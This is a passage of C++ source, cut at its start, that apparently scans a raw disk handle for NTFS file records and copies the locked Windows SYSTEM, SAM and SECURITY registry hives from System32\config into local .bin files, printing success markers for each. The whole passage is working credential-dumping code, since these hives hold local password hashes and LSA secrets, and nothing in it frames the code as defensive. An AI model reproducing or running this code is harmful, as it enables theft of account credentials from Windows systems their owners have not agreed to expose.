                if (ExtractFile(hDisk, (ULONGLONG)i, "sysi.bin")) {
                    printf("[+] SYSTEM\n");
                    sysi = true;
                }
            }

            if (info.filename == "SAM" && fullpath == "C:\\Windows\\System32\\config\\SAM") {
                printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
                    i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
                if (ExtractFile(hDisk, (ULONGLONG)i, "sami.bin")) {
                    printf("[+] SAM\n");
                    sami = true;
                }
            }

            if (info.filename == "SECURITY" && fullpath == "C:\\Windows\\System32\\config\\SECURITY") {
                printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
                    i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
                if (ExtractFile(hDisk, (ULONGLONG)i, "seci.bin")) {
                    printf("[+] SECURITY\n");
                    seci = true;
                }
            }
    }


    CloseHandle(hDisk);
    return 0;
}


